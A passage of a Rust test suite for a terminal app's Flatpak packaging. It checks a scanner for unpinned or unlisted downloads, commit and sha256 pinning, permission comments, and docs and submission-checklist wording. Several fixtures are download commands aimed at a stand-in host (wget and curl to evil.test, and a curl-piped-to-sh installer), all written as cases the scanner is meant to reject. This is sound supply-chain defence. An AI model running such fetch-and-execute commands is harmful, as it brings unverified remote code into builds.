    assert!(bad("RUN set -eu; \\\n    wget -O /tmp/x https://evil.test/x; \\\n    true"), "wget in a continued RUN");
    assert!(bad("ADD https://evil.test/x.tar.xz /opt/"), "ADD from an unlisted host");
    assert!(bad("  - url: https://evil.test/x.tar.xz\n    sha256: 00"), "a manifest url field");
    assert!(bad("RUN base=\"https://sh.rustup.rs\"; \\\n    curl -fsSL \"$base\" | sh"), "a fetch whose address is set on an earlier line");
    // The metadata and example values of the packaging are not fetches.
    for text in [
        "LABEL org.opencontainers.image.source=\"https://github.com/holzcloud/holzWave\" \\\n      a=b",
        "home: https://github.com/holzcloud/holzWave\nsources:\n  - https://github.com/holzcloud/holzWave",
        "{\n  \"public_url\": \"https://holzwave.example.net\"\n}",
        "  issuer: https://idp.example.net",
        "# curl https://evil.test/x is only a comment",
        "{ \"$schema\": \"http://json-schema.org/draft-07/schema#\", \"pattern\": \"^https://[^/\\\\s]+$\" }",
    ] {
        assert!(!bad(text), "not a fetch: {text}");
    }
}

#[test]
fn a_url_in_a_generated_sources_file_is_allowed_only_when_every_entry_is_pinned() {
    let sha = "a".repeat(64);
    let commit = "b".repeat(40);
    let generated = packaging().join("flatpak/generated/zig-sources.json");
    let archive = |extra: &str| format!("{{\"type\": \"archive\", \"url\": \"https://example.net/x.tar.gz\"{extra}}}");
    let pinned_archive = archive(&format!(", \"sha256\": \"{sha}\""));
    let pinned_git = format!("{{\"type\": \"git\", \"url\": \"https://example.net/x.git\", \"commit\": \"{commit}\"}}");
    // Pinned archives and pinned git sources pass, whatever the host: the pin is the check.
    assert!(generated_sources_are_pinned(&generated, &format!("[{pinned_archive}, {pinned_git}]")), "pinned entries");
    // One entry without a pin fails the whole file, so does a pin of the wrong shape.
    assert!(!generated_sources_are_pinned(&generated, &format!("[{pinned_archive}, {}]", archive(""))), "an unpinned entry");
    assert!(!generated_sources_are_pinned(&generated, &format!("[{}]", archive(", \"sha256\": \"abc123\""))), "a short sha256");
    assert!(!generated_sources_are_pinned(&generated, &format!("[{}]", archive(&format!(", \"sha256\": \"{}\"", "A".repeat(64))))), "an upper-case sha256");
    let branch = "{\"type\": \"git\", \"url\": \"https://example.net/x.git\", \"branch\": \"main\"}";
    assert!(!generated_sources_are_pinned(&generated, &format!("[{branch}]")), "a git source on a branch");
    let short_commit = "{\"type\": \"git\", \"url\": \"https://example.net/x.git\", \"commit\": \"deadbee\"}";
    assert!(!generated_sources_are_pinned(&generated, &format!("[{short_commit}]")), "a short commit");
    // The tools of the Cargo and npm sources write more than downloads: text files and copy commands. Those fetch nothing, so they
    // pass; a sha512 pins a download too (npm's own hash); a command that fetches, or an entry of another kind, does not pass.
    let inline = "{\"type\": \"inline\", \"contents\": \"[source.crates-io]\", \"dest\": \"cargo\", \"dest-filename\": \"config\"}";
    let copy = "{\"type\": \"shell\", \"commands\": [\"cp -r a b\"]}";
    let sha512 = "c".repeat(128);
    let npm_file = format!("{{\"type\": \"file\", \"url\": \"https://example.net/x.tgz\", \"sha512\": \"{sha512}\"}}");
    assert!(generated_sources_are_pinned(&generated, &format!("[{pinned_archive}, {inline}, {copy}, {npm_file}]")), "downloads, text and copy commands");
    let curl = "{\"type\": \"shell\", \"commands\": [\"curl -O https://evil.test/x\"]}";
    let curl_no_address = "{\"type\": \"shell\", \"commands\": [\"sh -c 'curl $X'\"]}";
    let address = "{\"type\": \"script\", \"commands\": [\"echo https://evil.test/x\"]}";
    let shell_with_url = "{\"type\": \"shell\", \"url\": \"https://evil.test/x\", \"commands\": [\"true\"]}";
    let inline_with_url = "{\"type\": \"inline\", \"url\": \"https://evil.test/x\", \"contents\": \"x\"}";
    let unknown_kind = "{\"type\": \"extra-data\", \"filename\": \"x\"}";
    let short_sha512 = "{\"type\": \"file\", \"url\": \"https://example.net/x.tgz\", \"sha512\": \"abc\"}";
    for (what, entry) in [
        ("a shell entry that runs curl", curl),
        ("a shell entry that runs curl with no address", curl_no_address),
        ("a script entry that names an address", address),
        ("a shell entry with a url", shell_with_url),
        ("an inline entry with a url", inline_with_url),
        ("an entry of an unknown kind", unknown_kind),
        ("a short sha512", short_sha512),
    ] {
        assert!(!generated_sources_are_pinned(&generated, &format!("[{pinned_archive}, {entry}]")), "{what}");
    }
    // Not a list of entries, no entry, or invalid JSON: nothing is allowed.
    assert!(!generated_sources_are_pinned(&generated, "[]"), "an empty list");
    assert!(!generated_sources_are_pinned(&generated, &pinned_archive), "an object instead of a list");
    assert!(!generated_sources_are_pinned(&generated, "[{\"url\": "), "invalid JSON");
    // The rule is by context: the same pinned text elsewhere under packaging, or in a file that is not JSON, gets no pass.
    let elsewhere = packaging().join("flatpak/zig-sources.json");
    assert!(!generated_sources_are_pinned(&elsewhere, &format!("[{pinned_archive}]")), "a pinned file outside generated/");
    let not_json = packaging().join("flatpak/generated/zig-sources.txt");
    assert!(!generated_sources_are_pinned(&not_json, &format!("[{pinned_archive}]")), "a pinned file that is not JSON");
    // The scan itself, on a file as the tool writes it (one field per line): a pinned file has no unlisted fetch, an unpinned
    // entry puts every address of the file back under the host rules, and the same pinned text elsewhere is not excused.
    let pretty = |entries: &[&str]| format!("[\n{}\n]", entries.join(",\n"));
    let pinned_entry = format!("  {{\n    \"type\": \"archive\",\n    \"url\": \"https://example.net/x.tar.gz\",\n    \"sha256\": \"{sha}\"\n  }}");
    let unpinned_entry = "  {\n    \"type\": \"archive\",\n    \"url\": \"https://example.net/y.tar.gz\"\n  }";
    assert!(!fetched_urls(&pretty(&[&pinned_entry])).is_empty(), "the url field of an entry is a fetch");
    assert!(unlisted_fetches(&generated, &pretty(&[&pinned_entry])).is_empty(), "a fully pinned generated file");
    assert!(!unlisted_fetches(&generated, &pretty(&[&pinned_entry, unpinned_entry])).is_empty(), "one unpinned entry fails the scan");
    assert!(!unlisted_fetches(&elsewhere, &pretty(&[&pinned_entry])).is_empty(), "the same file outside generated/ fails the scan");
}

#[test]
fn a_git_source_of_the_manifest_is_allowed_only_when_a_full_commit_pins_it() {
    let manifest = packaging().join("flatpak/ch.holzcloud.holzwave.yml");
    let commit = "d".repeat(40);
    let source = |fields: &str| format!("    sources:\n      - type: git\n        url: https://example.net/x.git\n{fields}      - other.json\n");
    let pinned = source(&format!("        commit: {commit}\n        dest: x\n"));
    assert!(unlisted_fetches(&manifest, &pinned).is_empty(), "a git source pinned by a full commit");
    let with_comment = source(&format!("        # why\n        commit: {commit}\n"));
    assert!(unlisted_fetches(&manifest, &with_comment).is_empty(), "a comment between the fields");
    assert!(!unlisted_fetches(&manifest, &source("        branch: main\n")).is_empty(), "a branch");
    assert!(!unlisted_fetches(&manifest, &source(&format!("        commit: {commit}\n        tag: v1\n"))).is_empty(), "a tag next to the commit");
    assert!(!unlisted_fetches(&manifest, &source("        commit: deadbee\n")).is_empty(), "a short commit");
    assert!(!unlisted_fetches(&manifest, &source(&format!("        commit: {}\n", "D".repeat(40)))).is_empty(), "an upper-case commit");
    assert!(!unlisted_fetches(&manifest, &source("        dest: x\n")).is_empty(), "no commit at all");
    // The commit of another item does not pin this one.
    let neighbour = format!("      - type: git\n        url: https://example.net/x.git\n      - type: git\n        url: https://example.net/y.git\n        commit: {commit}\n");
    assert_eq!(unlisted_fetches(&manifest, &neighbour), ["https://example.net/x.git"], "only the pinned item is excused");
    // The rule is by context: the same text in another kind of file, or outside packaging/flatpak, gets no pass.
    assert!(!unlisted_fetches(&packaging().join("flatpak/x.txt"), &pinned).is_empty(), "not a manifest");
    assert!(!unlisted_fetches(&packaging().join("other/x.yml"), &pinned).is_empty(), "not in packaging/flatpak");
    // An archive with a sha256 is not excused here (the Zig archives are by the host rule), and a curl is not a git source.
    assert!(!unlisted_fetches(&manifest, "      - type: archive\n        url: https://example.net/x.tar.xz\n        sha256: 00\n").is_empty());
}

#[test]
fn the_source_check_rejects_an_unlisted_host_and_an_unpinned_rustup_init() {
    let pinned = "ARG RUSTUP_VERSION=1.29.2\nsha256sum -c -\n";
    assert!(allowed_source(RUSTUP_INIT_URL, pinned));
    assert!(!allowed_source("https://example.com/rustup-init", pinned), "an unlisted host");
    assert!(!allowed_source("https://static.rust-lang.org/rustup/dist/x/rustup-init", pinned), "another path on the same host");
    assert!(!allowed_source("https://sh.rustup.rs", pinned), "the installer script");
    assert!(!allowed_source(RUSTUP_INIT_URL, "sha256sum -c -\n"), "no version pin");
    assert!(!allowed_source(RUSTUP_INIT_URL, "ARG RUSTUP_VERSION=stable\nsha256sum -c -\n"), "a floating version");
    assert!(!allowed_source(RUSTUP_INIT_URL, "ARG RUSTUP_VERSION=1.29.2\n"), "no checksum check");
}

#[test]
fn the_build_script_has_its_modes_and_never_publishes() {
    assert!(SCRIPT.contains("--check"), "the --check mode");
    assert!(SCRIPT.contains("--container-build") && SCRIPT.contains("flatpak-container-build: ok"), "the container build");
    assert!(SCRIPT.contains("flatpak-check: ok"), "the last line of a passed check");
    for validator in ["flatpak-builder", "appstreamcli validate", "desktop-file-validate"] {
        assert!(SCRIPT.contains(validator), "{validator} is not run");
    }
    assert!(SCRIPT.contains("--user --install --force-clean"), "the owner's mode builds and installs for the user");
    // The container build proves the build step had no network: it inspects the log of the holzwave module for any download
    // and prints its own line only when there is none. The script never gives a build the network.
    assert!(SCRIPT.contains("flatpak-container-build: offline"), "the container build's offline line");
    for word in ["Downloading", "Fetching", "Updating crates", "Updating git repository"] {
        assert!(SCRIPT.contains(word), "the container build does not look for {word:?} in the log of the holzwave module");
    }
    assert!(!SCRIPT.contains("--share=network") && !SCRIPT.contains("--network host"), "the script gives a build the network");
    // No publishing, signing, tagging or pushing of any kind.
    for forbidden in ["git push", "git tag", "gh release", "--gpg-sign", "--repo=", "build-bundle", "build-export", "flatpak-builder --export"] {
        assert!(!SCRIPT.contains(forbidden), "the script contains {forbidden}");
    }
}

#[test]
fn the_two_added_permissions_say_why_and_what_they_cost_and_the_host_permission_names_the_setting() {
    // The SSH agent socket: the in-process client reads the agent from SSH_AUTH_SOCK.
    let ssh = comment_above_item(SSH_PERMISSION);
    for word in ["ssh_auth_sock", "agent", "in-process", "cost", "host permission"] {
        assert!(ssh.contains(word), "the comment above {SSH_PERMISSION} does not say {word:?}: {ssh}");
    }
    // The Secret Service: the keychain of the Linux build speaks it on the session bus, and the Secret portal does not cover it.
    let secrets = comment_above_item(SECRETS_PERMISSION);
    for word in ["secret service", "session bus", "keychain", "secret portal", "cost", "host permission"] {
        assert!(secrets.contains(word), "the comment above {SECRETS_PERMISSION} does not say {word:?}: {secrets}");
    }
    // The host permission is still a sandbox escape by design, and now says that a setting decides whether panes use it.
    let host = comment_above_item(HOST_PERMISSION);
    for word in [
        "sandbox escape by design",
        "host",
        "panes start in the sandbox by default",
        "host shell",
        "off by default",
        "never synced",
        "only in a flatpak",
        "integrations",
    ] {
        assert!(host.contains(word), "the comment above {HOST_PERMISSION} does not say {word:?}: {host}");
    }
    // The old statements that every pane runs on the host are gone from the manifest.
    let manifest = squashed(MANIFEST);
    for stale in ["the shells of the panes run on the host", "the shell is not started in the sandbox", "moved out of 0.0.1 (docs/flatpak.md)"] {
        assert!(!manifest.contains(stale), "the manifest still says {stale:?}");
    }
}

#[test]
fn the_description_says_what_is_true_now_and_none_of_the_old_sentences() {
    let text = squashed(description());
    for (what, phrase) in [
        ("it starts with the word beta", "beta"),
        ("panes start in the sandbox by default", "panes start in the sandbox by default"),
        ("the permission to run commands on the host is shipped", "permission to run commands on the host"),
        ("the permission is named", "org.freedesktop.flatpak"),
        ("the person switches it on in settings", "switch it on in settings"),
        ("the setting is off by default", "off by default"),
        ("it is never synced", "never synced"),
        ("a removed permission reads not available", "not available"),
        ("the ssh agent is asked for", "--socket=ssh-auth"),
        ("and why", "the keys in your agent"),
        ("the secret service is asked for", "--talk-name=org.freedesktop.secrets"),
        ("and why", "system keychain"),
        ("the network is asked for", "--share=network"),
        ("the integrations are not available", "integrations"),
        ("what is untested", "have not been tested"),
        ("it was never started on a desktop", "never been started on a linux desktop"),
    ] {
        assert!(text.contains(phrase), "the AppStream description does not say ({what}) {phrase:?}: {text}");
    }
    // `Beta` is the first word of the first paragraph.
    let first = description().split("<p>").nth(1).expect("a first paragraph").trim_start();
    assert!(first.starts_with("Beta"), "the first paragraph does not start with Beta: {first}");
    // The sentences that are no longer true.
    for stale in [
        "the shell therefore runs on the host",
        "local build, not a flathub package",
        "this is a local build",
        "the shells you open run on the host and use the host's network",
    ] {
        assert!(!text.contains(stale), "the AppStream description still says {stale:?}");
    }
}

#[test]
fn the_metainfo_names_the_developer_the_links_the_brand_colours_and_the_releases() {
    let xml = metainfo_elements();
    // The developer is the same string in every channel; its id is the reverse domain of the verified domain.
    assert!(xml.contains("<developer id=\"ch.holzcloud\">"), "the developer id");
    assert!(xml.contains("<name>holzcloud.ch</name>"), "the developer name is holzcloud.ch");
    assert_eq!(xml.matches("<developer ").count(), 1, "one developer element");
    assert!(xml.contains("<url type=\"homepage\">https://holzcloud.ch/holzwave</url>"), "homepage");
    assert!(xml.contains("<url type=\"bugtracker\">https://github.com/holzcloud/holzWave/issues</url>"), "bug tracker");
    assert!(xml.contains("<url type=\"vcs-browser\">https://github.com/holzcloud/holzWave</url>"), "source");
    // Branding: a light and a dark primary colour, each a token of the design spec (a comment names them).
    let rose = "#FF8FB8";
    let rose_deep = "#C23B72";
    assert!(xml.contains(&format!("<color type=\"primary\" scheme_preference=\"light\">{rose}</color>")), "light brand colour");
    assert!(xml.contains(&format!("<color type=\"primary\" scheme_preference=\"dark\">{rose_deep}</color>")), "dark brand colour");
    let design = include_str!("../../../docs/design.md");
    assert!(design.contains(&format!("`{rose}`")) && design.contains(&format!("`{rose_deep}`")), "the colours are tokens of docs/design.md");
    let comments = metainfo_comments();
    // An XML comment cannot hold two hyphens, so the comment writes the token names without their leading pair.
    for word in ["hw-rose", "hw-rose-deep", "listing", "not a ui colour"] {
        assert!(comments.contains(word), "no comment says {word:?} about the brand colours: {comments}");
    }
    assert!(xml.contains("<content_rating type=\"oars-1.1\"/>"), "OARS");
    // Releases: every one has a date and notes; a beta is a development release; none is invented.
    let releases = xml.split("<releases>").nth(1).and_then(|r| r.split("</releases>").next()).expect("releases");
    assert_eq!(releases.matches("<release ").count(), 3, "the three releases that exist: {releases}");
    for version in ["0.0.1-beta2", "0.0.1-beta1", "0.0.1-alpha3"] {
        let entry = releases.split(&format!("<release version=\"{version}\"")).nth(1).unwrap_or_else(|| panic!("release {version}"));
        let tag = entry.split('>').next().expect("a tag");
        assert!(tag.contains("date=\"2026-"), "{version} has a date: {tag}");
        assert!(tag.contains("type=\"development\""), "{version} is a pre-release: {tag}");
        assert!(entry.contains("<description>"), "{version} has release notes");
    }
}

#[test]
fn the_metainfo_has_no_screenshot_and_no_invented_address_and_says_the_owner_adds_real_ones() {
    let xml = metainfo_elements();
    assert!(!xml.contains("<screenshot"), "an element for a screenshot: none exists, the owner takes them");
    assert!(!xml.contains(".png") && !xml.contains(".jpg") && !xml.contains(".webp"), "an image address");
    let comments = metainfo_comments();
    for word in ["screenshots", "real", "running flatpak", "release tag", "owner"] {
        assert!(comments.contains(word), "the comment block for the screenshots does not say {word:?}: {comments}");
    }
    // Every address in the elements is one that the project owns or that exists in the repository's other pages.
    let allowed = [
        "https://holzcloud.ch/holzwave",
        "https://github.com/holzcloud/holzWave/issues",
        "https://github.com/holzcloud/holzWave",
    ];
    for url in urls_in(&xml) {
        assert!(allowed.contains(&url.as_str()), "an address that nothing in the project backs: {url}");
    }
}

// ---- the page, the test plan rows ------------------------------------------------------------------------------------------

/// The labels of a private planning tree that must not appear in a public page: a plan id (two digits of a phase, a hyphen, two
/// digits), a threat id and the name of a phase directory. Built from pieces so that this file holds none.
fn planning_labels(text: &str) -> Vec<String> {
    let phases = ["07", "08", "10", "11", "13"];
    let directories = [
        String::from("07-") + "extras",
        String::from("08-") + "native" + "-integrationen",
        String::from("10-") + "politur",
        String::from("11-") + "web",
        String::from("13-") + "verteilung",
    ];
    let chars: Vec<char> = text.chars().collect();
    let mut found = Vec::new();
    for i in 0..chars.len() {
        let at = |pattern: &str| pattern.chars().enumerate().all(|(k, c)| chars.get(i + k) == Some(&c));
        for phase in phases {
            if at(&format!("{phase}-")) {
                let before_ok = i == 0 || !(chars[i - 1].is_alphanumeric() || matches!(chars[i - 1], '-' | '_' | '.'));
                let digits = chars.get(i + 3).is_some_and(char::is_ascii_digit) && chars.get(i + 4).is_some_and(char::is_ascii_digit);
                let after_ok = !chars.get(i + 5).is_some_and(char::is_ascii_digit);
                if before_ok && digits && after_ok {
                    found.push(chars[i..i + 5].iter().collect());
                }
            }
            if at(&format!("T-{phase}-")) && chars.get(i + 5).is_some_and(char::is_ascii_digit) {
                found.push(chars[i..i + 6].iter().collect());
            }
        }
        for directory in &directories {
            if at(directory) {
                found.push(directory.clone());
            }
        }
    }
    found
}

/// True when `text` has a letter that only German uses or a word that only German has: the files of the repository are English.
fn looks_german(text: &str) -> bool {
    let lower = text.to_lowercase();
    lower.chars().any(|c| matches!(c, 'ä' | 'ö' | 'ü' | 'ß'))
        || [" und ", " nicht ", " ist ", " herausgenommen", " bauen lokal"].iter().any(|w| lower.contains(w))
}

#[test]
fn the_label_scan_of_these_tests_sees_ids_and_skips_dates() {
    assert_eq!(planning_labels(&format!("see ({}-{})", "13", "12")), [format!("{}-{}", "13", "12")]);
    assert_eq!(planning_labels(&format!("T-{}-{}", "13", "55")), [format!("T-{}-{}", "13", "5")]);
    assert!(planning_labels(&format!("on 2026-{}-{}", "10", "12")).is_empty(), "inside a date");
    assert!(planning_labels("rows FPK1 to FPK7 and 0.0.1-beta2").is_empty());
    assert!(looks_german("das ist nicht gut") && looks_german("Größe") && !looks_german("this is English"));
}

#[test]
fn the_page_has_a_status_box_that_says_not_submitted_and_never_started() {
    let head = squashed(&FLATPAK_PAGE.lines().take(12).collect::<Vec<_>>().join(" "));
    for phrase in [
        "status: not submitted to flathub, never started on a machine",
        "built once in a container on arm64",
        "nobody has started it",
        "every desktop is untried",
        "x86_64 build was not run",
        "it is a beta",
    ] {
        assert!(head.contains(phrase), "the status box of docs/flatpak.md does not say {phrase:?}: {head}");
    }
    assert!(FLATPAK_PAGE.lines().nth(2).is_some_and(|l| l.starts_with("> **Status:")), "the status box is the first thing under the title");
}

#[test]
fn every_finish_argument_is_in_the_page_table() {
    let section = a_section(FLATPAK_PAGE, "## What it costs in sandboxing");
    let rows: Vec<&str> = section.lines().filter(|l| l.starts_with('|')).collect();
    let args = manifest_list("finish-args");
    assert_eq!(args.len(), 9, "the manifest has nine permissions: {args:?}");
    for arg in &args {
        let row = rows
            .iter()
            .find(|row| row.split('|').nth(1).is_some_and(|cell| cell.trim() == format!("`{arg}`")))
            .unwrap_or_else(|| panic!("{arg} has no row in the permission table of docs/flatpak.md"));
        // Three cells: the permission, what it is for, what it costs; none of them empty.
        let cells: Vec<&str> = row.split('|').map(str::trim).collect();
        assert_eq!(cells.len(), 5, "a row has a permission, a purpose and a cost: {row}");
        assert!(cells[2].len() > 10 && cells[3].len() > 10, "the row of {arg} does not say what it is for and what it costs: {row}");
    }
    // The table has no row that the manifest does not have.
    let table: Vec<&str> =
        rows.iter().filter(|r| !r.starts_with("|---") && !r.starts_with("| Permission")).copied().collect();
    assert_eq!(table.len(), args.len(), "the table and the manifest list the same permissions");
    // The text under the table says what the setting does and cannot do.
    let text = squashed(&section);
    for phrase in [
        "removes the sandbox for this app",
        "`host shell` is off by default",
        "never synced",
        "cannot grant the permission",
        "reads `not available`",
        "does not protect the rest of your system",
        "integrations",
        "do not run in a flatpak",
        "--no-talk-name=org.freedesktop.flatpak",
    ] {
        assert!(text.contains(phrase), "the permission section of docs/flatpak.md does not say {phrase:?}");
    }
}

#[test]
fn the_page_says_where_the_data_is_how_to_take_the_network_away_and_what_wsh_is_in_each_kind_of_pane() {
    let page = squashed(FLATPAK_PAGE);
    for phrase in [
        "~/.var/app/ch.holzcloud.holzwave/",
        "app data directory",
        "flatpak override --user --unshare=network ch.holzcloud.holzwave",
        "flatpak override --user --reset ch.holzcloud.holzwave",
    ] {
        assert!(page.contains(phrase), "docs/flatpak.md does not say {phrase:?}");
    }
    let wsh = squashed(&a_section(FLATPAK_PAGE, "## What the Flatpak does not carry: `wsh`"));
    for phrase in ["in a sandbox pane", "no `wsh`", "in a host pane", "cannot see `/app/bin`", "wsh-linux.sh"] {
        assert!(wsh.contains(phrase), "the wsh section of docs/flatpak.md does not say {phrase:?}: {wsh}");
    }
    // Two modes of starting a shell, the default first, and the two notice sentences of the design spec.
    let shell = squashed(&a_section(FLATPAK_PAGE, "## How the shell is started"));
    assert!(shell.find("**sandbox (the default).**") < shell.find("**host (`host shell` on).**"), "the sandbox comes first: {shell}");
    for phrase in [
        "holzwave: this pane runs inside the flatpak sandbox. to use the tools on this computer, turn on host shell in settings.",
        "this flatpak has no permission to run commands on the host",
        "osc 7",
        "is an assumption",
        "flatpak-spawn --host --watch-bus",
    ] {
        assert!(shell.contains(phrase), "the shell section of docs/flatpak.md does not say {phrase:?}");
    }
}

#[test]
fn the_page_has_none_of_the_old_claims_and_no_label_of_the_planning_tree_and_no_german() {
    let page = squashed(FLATPAK_PAGE);
    for stale in [
        "started **on the host**",
        "flathub submission is not planned",
        "would not accept this permission",
        "it is a local build from this repository, never a flathub package",
        "its panes run on the host through `flatpak-spawn --host`, and a shell on the host cannot see",
        "with the network allowed in the build step",
        "(`--share=network` as a build argument",
        "the manifest does not ask for its d-bus name",
        "roadmap",
        "desk-31",
    ] {
        assert!(!page.contains(stale), "docs/flatpak.md still says {stale:?}");
    }
    assert_eq!(planning_labels(FLATPAK_PAGE), Vec::<String>::new(), "labels of the private planning tree in docs/flatpak.md");
    assert!(!looks_german(FLATPAK_PAGE), "docs/flatpak.md is English only");
}

#[test]
fn the_test_plan_has_the_seven_flatpak_rows_and_every_result_is_empty() {
    let words: [(&str, &[&str]); 7] = [
        ("FPK1", &["`off`", "runs inside the flatpak sandbox", "/.flatpak-info", "sandbox"]),
        ("FPK2", &["run panes on the host", "`on`", "host_shell.json"]),
        ("FPK3", &["--no-talk-name=org.freedesktop.flatpak", "not available", "--reset"]),
        ("FPK4", &["ctrl+z", "sudo", "tty", "job control"]),
        ("FPK5", &["ssh_auth_sock", "ssh-add -l", "no ssh-agent is running"]),
        ("FPK6", &["secret service", "keychain", "grep -r"]),
        ("FPK7", &["dsk1 to dsk10", "gnome", "kde plasma", "xfce", "cinnamon", "mate", "sway", "hyprland", "i3", "untried"]),
    ];
    for (id, needles) in words {
        let row = TEST_PLAN.lines().find(|l| l.starts_with(&format!("| {id} |"))).unwrap_or_else(|| panic!("row {id} of docs/test-plan.md"));
        assert_eq!(row.matches('|').count(), 6, "{id} has five cells and no pipe character inside one: {row}");
        assert!(row.trim_end().ends_with("|  |") || row.trim_end().ends_with("| |"), "the Result cell of {id} is not empty: nothing was run");
        let text = squashed(row);
        for needle in needles {
            assert!(text.contains(needle), "row {id} does not say {needle:?}");
        }
    }
    // Neither the rows nor the page they belong to carry a plan label.
    assert_eq!(planning_labels(TEST_PLAN.split("## Part 12").nth(1).expect("part 12")), Vec::<String>::new());
}

// ---- the owner's checklist for a Flathub submission --------------------------------------------------------------------------

#[test]
fn the_checklist_says_first_that_the_owner_writes_everything_by_hand_and_holds_no_pull_request_text() {
    let head = squashed(&SUBMISSION_PAGE.lines().take(8).collect::<Vec<_>>().join(" "));
    for phrase in [
        "status: not submitted",
        "nothing on this page is a submission",
        "the owner writes the flathub manifest, the metainfo and the pull request by hand",
        "an agent must not open or automate the submission",
        "the files under `packaging/flatpak/` are references",
        "this page contains no text for the pull request",
    ] {
        assert!(head.contains(phrase), "the first lines of docs/flathub-submission.md do not say {phrase:?}: {head}");
    }
    // It is a list of steps with reasons: no block meant to be pasted (no fenced block, no quoted draft of a description or a
    // commit message, no `Add ch.holzcloud...` title) and no pull request template of its own.
    assert!(!SUBMISSION_PAGE.contains("```"), "a fenced block: the page holds steps, not text to paste");
    let text = squashed(SUBMISSION_PAGE);
    for pasted in ["add ch.holzcloud.holzwave", "## description", "### description", "this pull request adds", "i have read"] {
        assert!(!text.contains(pasted), "the checklist holds text that looks meant for a submission: {pasted:?}");
    }
}

#[test]
fn the_checklist_lists_the_steps_in_order() {
    // A step is its numbered line and the indented lines that continue it.
    let mut steps: Vec<String> = Vec::new();
    for line in SUBMISSION_PAGE.lines().skip_while(|l| *l != "## The steps, in order").skip(1).take_while(|l| !l.starts_with("## ")) {
        if line.chars().next().is_some_and(|c| c.is_ascii_digit()) {
            steps.push(line.to_owned());
        } else if line.starts_with(' ') {
            let last = steps.last_mut().expect("a continuation follows a step");
            last.push(' ');
            last.push_str(line);
        }
    }
    let steps: Vec<String> = steps.iter().map(|step| squashed(step)).collect();
    let expected = [
        ("1. **run the flatpak rows on a linux machine.**", "fpk1 to fpk7"),
        ("2. **take real screenshots.**", "docs/design/"),
        ("3. **cut the release, and set the tag and the screenshot addresses.**", "no release tag exists"),
        ("4. **prove the domain.**", "/.well-known/org.flathub.verifiedapps.txt"),
        ("5. **decide the beta flow.**", "flathub-beta"),
        ("6. **fork and open the pull request.**", "`new-pr`"),
        ("7. **explain each permission, in your own words.**", "the secret service name"),
        ("8. **read the linter's warning for the host permission.**", "finish-args-flatpak-spawn-access"),
        ("9. **disclose the ai use.**", "readme"),
        ("10. **answer the reviewers.**", "volunteers"),
        ("11. **know the fallbacks before you start**", "most likely to ask"),
    ];
    assert_eq!(steps.len(), expected.len(), "the numbered steps: {steps:?}");
    for (step, (start, keyword)) in steps.iter().zip(expected) {
        assert!(step.starts_with(start), "step out of order or missing: wanted {start:?}, found {step:?}");
        assert!(step.contains(keyword), "the step {start:?} does not say {keyword:?}");
    }
    // The domain step is the owner's, and says where the token goes and that it is free; the permission topics are topics.
    let domain = &steps[3];
    for phrase in ["holzcloud.ch", "dns txt record", "the owner's step", "an agent cannot do it"] {
        assert!(domain.contains(phrase), "the domain step does not say {phrase:?}");
    }
    let permissions = &steps[6];
    for topic in ["the host", "the home folder", "the network", "the ssh agent socket", "the secret service name"] {
        assert!(permissions.contains(topic), "the permission step does not name the topic {topic:?}");
    }
}

#[test]
fn the_checklist_states_the_three_designs_in_the_order_they_are_tried_and_the_first_is_current() {
    let section = a_section(SUBMISSION_PAGE, "## The three designs, in the order they are tried");
    let text = squashed(&section);
    let a = text.find("1. **design a (the current one)").expect("design A first");
    let b = text.find("2. **design b: no permission, a documented override.**").expect("design B second");
    let c = text.find("3. **design c: the setting only outside flathub.**").expect("design C third");
    assert!(a < b && b < c, "the designs are in the order A, B, C");
    for phrase in ["the permission is shipped, a setting decides", "what it costs the person", "a sandbox-only terminal"] {
        assert!(text.contains(phrase), "the designs do not say {phrase:?}");
    }
    assert_eq!(text.matches("what it costs the person").count(), 3, "each design says what it costs the person");
}

#[test]
fn the_checklist_says_what_is_known_and_unknown_about_acceptance() {
    let section = squashed(&a_section(SUBMISSION_PAGE, "## What is known and what is not"));
    for terminal in ["konsole", "wezterm", "blackbox", "ptyxis", "contour"] {
        assert!(section.contains(terminal), "the terminal {terminal} is not named");
    }
    for phrase in [
        "five terminals on flathub ship the permission",
        "read on 2026-11-05",
        "nobody has asked the maintainers",
        "a listing that starts as a beta",
        "a zig toolchain archive",
        "native npm packages",
        "is an opinion of the person who answered",
        "maturity is the reviewers' call",
        "single-maintainer beta",
    ] {
        assert!(section.contains(phrase), "the known-and-unknown section does not say {phrase:?}");
    }
    // The AI rule, and that the page links the README disclosure and the references.
    let page = squashed(SUBMISSION_PAGE);
    for phrase in ["must not contain ai-generated or ai-assisted content", "[readme.md](../readme.md)", "flatpak.md", "unmodified output of a tool"] {
        assert!(page.contains(phrase), "docs/flathub-submission.md does not say {phrase:?}");
    }
}

#[test]
fn the_checklist_has_no_label_of_the_planning_tree_and_no_german() {
    assert_eq!(planning_labels(SUBMISSION_PAGE), Vec::<String>::new(), "labels of the private planning tree in docs/flathub-submission.md");
    assert!(!looks_german(SUBMISSION_PAGE), "docs/flathub-submission.md is English only");
}
